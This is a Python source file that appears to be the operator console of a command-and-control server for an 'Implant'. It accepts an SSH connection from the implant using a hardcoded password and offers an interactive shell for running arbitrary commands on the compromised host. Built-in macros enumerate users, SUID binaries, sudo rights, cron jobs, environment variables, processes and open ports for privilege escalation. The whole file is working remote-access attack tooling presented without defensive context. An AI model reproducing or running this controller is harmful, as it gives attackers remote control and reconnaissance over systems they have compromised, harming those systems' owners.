import paramiko
import os
import socket
import sys

class sshServer(paramiko.ServerInterface):
    # Determine if a channel request of a given type will be granted
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    # Determine if username and password are valid
    def check_auth_password(self, username, password):
        if (username == 'sshuser1') and (password == '$$#pa55'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def main():
    server = '0.0.0.0'
    port = 2222
    
    CWD = os.path.dirname(os.path.realpath(__file__))
    HOSTKEY = paramiko.Ed25519Key(filename=os.path.join(CWD, 'id_ed25519'))
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print('Listening for connections from Implant...')
        client, addr = sock.accept()
        print(f"Connection accepted from {addr[0]}:{addr[1]}")
    except KeyboardInterrupt:
        sys.exit()

    SSH_session = paramiko.Transport(client)
    SSH_session.add_server_key(HOSTKEY)
    server_obj = sshServer()
    SSH_session.start_server(server=server_obj)
    
    chan = SSH_session.accept()
    if chan is None:
        print('Transport Error: Failed to open channel.')
        sys.exit()

    # Receive check-in banner from implant
    try:
        success_messg = chan.recv(1024).decode()
        print(f"\n[+] {success_messg}")
        chan.send(b"Server connected.\n")
    except Exception as e:
        print(f"Failed to receive check-in: {e}")
        sys.exit()

    # Interactive Command Loop
    try:
        while True:
            cmd_line = input('ahmadsShell#> ').strip()
            
            if not cmd_line:
                continue

            if cmd_line == 'exit':
                chan.send(b'exit')
                break

            # Macro expansions
            if cmd_line == "gimi_users":
                command = "getent passwd | grep -E '/bin/(bash|sh|zsh)' | cut -d: -f1,3,6"
            elif cmd_line == "gimi_sysinfo":
                command = "uname -a; lsb_release -a"
            elif cmd_line == "gimi_procs":
                command = "ps aux --forest || ps aux"
            elif cmd_line == "gimi_ports":
                command = "ss -tulnp || netstat -tulnp"
            elif cmd_line == "gimi_privs":
                command = "sudo -l -n 2>/dev/null; find / -perm -4000 -type f 2>/dev/null"
            elif cmd_line == "gimi_cron":
                command = "crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null"
            elif cmd_line == "gimi_env":
                command = "ip a || ifconfig; pwd; env"
            else:
                command = cmd_line

            # Send command and print response
            chan.send(command.encode())
            ret_value = chan.recv(65536)
            print(ret_value.decode())

    except (KeyboardInterrupt, EOFError):
        print("\nExiting server...")
    except Exception as e:
        print(f"Error during execution: {e}")
    finally:
        chan.close()
        SSH_session.close()

if __name__ == '__main__':
    main()